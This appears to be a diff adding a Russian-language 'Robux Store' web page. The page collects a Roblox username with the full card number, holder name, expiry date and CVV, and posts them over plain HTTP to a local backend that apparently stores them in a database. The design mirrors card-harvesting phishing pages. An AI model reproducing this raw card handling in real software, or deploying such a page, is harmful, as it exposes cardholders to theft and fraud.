@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Store - Купить Робуксы</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        h1 { color: #00b06f; }
+
+        .packages {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .package-card {
+            background: #2c2c2c;
+            border: 2px solid #3a3a3a;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            width: 200px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .package-card:hover {
+            border-color: #00b06f;
+            transform: translateY(-5px);
+        }
+
+        .package-card.selected {
+            border-color: #00b06f;
+            background-color: #23352d;
+        }
+
+        .robux-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .price {
+            color: #aaa;
+            margin-top: 10px;
+        }
+
+        .payment-form {
+            background: #2c2c2c;
+            padding: 30px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background: #333;
+            color: white;
+            box-sizing: border-box; /* Важно для padding */
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00b06f;
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #00915b;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Магазин Робуксов</h1>
+
+    <div class="packages">
+        <div class="package-card" onclick="selectPackage(400, 4.99, this)">
+            <div class="robux-amount">400 R$</div>
+            <div class="price">$4.99</div>
+        </div>
+        <div class="package-card" onclick="selectPackage(800, 9.99, this)">
+            <div class="robux-amount">800 R$</div>
+            <div class="price">$9.99</div>
+        </div>
+        <div class="package-card" onclick="selectPackage(1700, 19.99, this)">
+            <div class="robux-amount">1700 R$</div>
+            <div class="price">$19.99</div>
+        </div>
+    </div>
+
+    <div class="payment-form">
+        <h3 style="text-align: center; margin-top: 0;">Оплата картой</h3>
+        
+        <div class="form-group">
+            <label>Никнейм в Roblox</label>
+            <input type="text" id="username" placeholder="Введи свой ник">
+        </div>
+
+        <div class="form-group">
+            <label>Номер карты</label>
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+        </div>
+
+        <div class="form-group">
+            <label>Владелец карты</label>
+            <input type="text" id="cardHolder" placeholder="IVAN IVANOV">
+        </div>
+
+        <div class="row">
+            <div class="form-group" style="flex: 1;">
+                <label>Срок (MM/YY)</label>
+                <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
+            </div>
+            <div class="form-group" style="flex: 1;">
+                <label>CVC/CVV</label>
+                <input type="password" id="cvv" placeholder="123" maxlength="3">
+            </div>
+        </div>
+
+        <button onclick="submitOrder()">Купить</button>
+    </div>
+
+    <script>
+        let selectedAmount = 0;
+        let selectedPrice = 0;
+
+        function selectPackage(amount, price, element) {
+            selectedAmount = amount;
+            selectedPrice = price;
+
+            // Убираем выделение со всех
+            document.querySelectorAll('.package-card').forEach(card => card.classList.remove('selected'));
+            // Выделяем текущий
+            element.classList.add('selected');
+        }
+
+        async function submitOrder() {
+            if (selectedAmount === 0) {
+                alert("Пожалуйста, выберите количество робуксов!");
+                return;
+            }
+
+            const username = document.getElementById('username').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardHolder = document.getElementById('cardHolder').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            if (!username || !cardNumber || !cvv) {
+                alert("Заполните все поля!");
+                return;
+            }
+
+            const data = {
+                username: username,
+                robuxAmount: selectedAmount,
+                price: selectedPrice,
+                cardNumber: cardNumber,
+                cardHolder: cardHolder,
+                expiryDate: expiryDate,
+                cvv: cvv
+            };
+
+            try {
+                // Отправка данных на бэкенд
+                const response = await fetch('http://localhost:8081/api/orders/buy', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    alert("Успешно! Данные отправлены в базу.");
+                    // Очистка формы
+                    document.getElementById('username').value = '';
+                    document.getElementById('cardNumber').value = '';
+                    document.getElementById('cvv').value = '';
+                } else {
+                    alert("Ошибка сервера");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("Ошибка соединения с сервером");
+            }
+        }
+    </script>
+</body>
+</html>
